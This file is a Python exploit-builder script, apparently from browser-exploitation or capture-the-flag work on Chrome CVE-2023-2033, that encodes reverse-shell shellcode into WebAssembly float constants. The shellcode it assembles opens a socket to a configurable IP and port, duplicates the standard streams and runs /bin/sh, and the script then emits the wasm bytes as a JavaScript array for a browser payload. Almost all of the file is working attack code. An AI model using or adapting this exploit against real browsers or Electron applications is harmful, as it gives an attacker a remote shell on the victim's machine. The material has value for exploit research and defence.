#!/usr/bin/python3
# AUTO PWN Script: @Jopraveen
# Ref for the make_double part: https://www.turb0.one/pages/Weaponizing_Chrome_CVE-2023-2033_for_RCE_in_Electron:_Some_Assembly_Required.html

# make sure to download wasm here [https://github.com/WebAssembly/wabt/releases]
# because `wat2wasm` binary is required to generate wasm code

from pwn import *
import socket
import struct
context.arch = "amd64"

IP = "0x7f000001"  # 127.0.0.1
PORT = "0x01bb"  # 443


def hex_to_fl(hex_val):
    return struct.unpack('!d', bytes.fromhex(hex_val))[0]


# MAKE DOUBLE shellcode
all_float_values = []
jmp = b'\xeb\x0c'
global current_byte
current_byte = 0x90
global read_bytes
read_bytes = 0


def junk_byte():
    global current_byte
    global read_bytes
    current_byte = (current_byte + read_bytes + 0x17) & 0xFF
    read_bytes += 1
    return current_byte.to_bytes(1, byteorder="big")


global made
made = 0


def make_double(code):
    assert len(code) <= 6
    global made
    tojmp = 0xc
    # tojmp = 0x12
    if made > 14:
        tojmp += 3
    jmp = b'\xeb'
    tojmp += 6-len(code)
    made = made+1
    jmp += tojmp.to_bytes(1, byteorder='big')
    # print("0x"+hex(u64((code+jmp).ljust(8, junk_byte())))[2:].rjust(16,'0').upper()+"n,")
    all_float_values.append(hex_to_fl(
        hex(u64((code+jmp).ljust(8, junk_byte())))[2:].rjust(16, '0').upper()))


# Shellcode
# socket(2,1,6)
make_double(asm('xor rax,rax'))
make_double(asm('xor rdi,rdi'))
make_double(asm('xor rsi,rsi'))
make_double(asm('xor rdx,rdx'))
make_double(asm('xor r8,r8'))
make_double(asm('push 0x2'))
make_double(asm('pop rdi'))
make_double(asm('push 0x1'))
make_double(asm('pop rsi'))
make_double(asm('push 0x6'))
make_double(asm('pop rdx; push 0x29'))
make_double(asm(' mov rcx,r12'))
make_double(asm('pop rax; syscall'))

# connect syscall
make_double(asm('mov r8,rax'))
make_double(asm('xor rsi,rsi'))
make_double(asm('xor r10,r10'))
make_double(asm('push r10'))
make_double(asm("mov BYTE PTR [rsp],0x2"))

# port crafting
make_double(asm("mov BYTE PTR [rsp+0x1],0x0"))
make_double(asm("mov BYTE PTR [rsp+0x2], 0x"+PORT[2:4]))
make_double(asm("mov BYTE PTR [rsp+0x3], 0x"+PORT[4:6]))

# IP crafting
make_double(asm("mov BYTE PTR [rsp+0x4], 0x"+IP[2:4]))
make_double(asm("mov BYTE PTR [rsp+0x5], 0x"+IP[4:6]))
make_double(asm("mov BYTE PTR [rsp+0x6], 0x"+IP[6:8]))
make_double(asm("mov BYTE PTR [rsp+0x7], 0x"+IP[8:10]))

# remaining connect
make_double(asm('mov rsi,rsp'))
make_double(asm('push 0x10'))
make_double(asm('pop rdx'))
make_double(asm('push r8'))
make_double(asm('pop rdi'))
make_double(asm('push 0x2a'))
make_double(asm('pop rax'))
make_double(asm('syscall'))

# dup2 syscall & jmp handling
make_double(asm('xor rsi,rsi'))
make_double(asm('push 0x3'))
make_double(asm('pop rsi'))
make_double(asm('dec rsi'))
make_double(asm('push 0x21'))
make_double(asm('pop rax'))
make_double(asm('syscall'))

# print("0x0feb90909090a275n,") # for jmping (correct)
all_float_values.append(hex_to_fl("0feb90909090a275"))

# exceve syscall
make_double(asm('xor rdi,rdi'))
make_double(asm('push rdi'))
make_double(asm('push rdi'))
make_double(asm('pop rsi'))
make_double(asm('pop rdx'))

# execve single byte chain
make_double(asm("push 0x1337"))
make_double(asm("pop rdi; push rdi"))
make_double(asm("mov rdi, rsp;"))
make_double(asm("mov BYTE PTR [rdi], 0x2f"))
make_double(asm("mov BYTE PTR [rdi+0x1], 0x62"))
make_double(asm("mov BYTE PTR [rdi+0x2], 0x69"))
make_double(asm("mov BYTE PTR [rdi+0x3], 0x6e"))
make_double(asm("mov BYTE PTR [rdi+0x4], 0x2f"))
make_double(asm("mov BYTE PTR [rdi+0x5], 0x73"))
make_double(asm("mov BYTE PTR [rdi+0x6], 0x68"))
make_double(asm("mov BYTE PTR [rdi+0x7], 0x00"))

make_double(asm('push 0x3b'))
make_double(asm('pop rax'))
make_double(asm('syscall'))

wat_code = '''
(module
  (func (export "main") (result f64)

;; random values to skip the first 8 sets
f64.const  -1.1434324392442428853e-117
f64.const  -5.4434324392442428853e-127
f64.const  -11.1434124392442428853e-137
f64.const  -13.14364224392442428853e-417
f64.const  -8.1434324392442428853e-217
f64.const  -9.14343124392442428853e-917
f64.const  -4.1434324392442428853e-147
f64.const  -3.1434324392442428853e-207
;; actual shellcode start
'''

for fl_val in all_float_values:
    wat_code += f'f64.const  {fl_val}\n'
for fl_val in all_float_values[1:]:
    wat_code += f'drop\n'

wat_code += '''
;; actual shellcode end
drop
drop
drop
drop
drop
drop
drop
drop
))
'''

open('exp.wat', 'w').write(wat_code)
os.system('./wat2wasm exp.wat')
wasm_bytes = open('exp.wasm', 'rb').read()
print('let shell_wasm_code = new Uint8Array([', end=' ')
for byte in wasm_bytes:
    print(byte, end=', ')
print(']);')
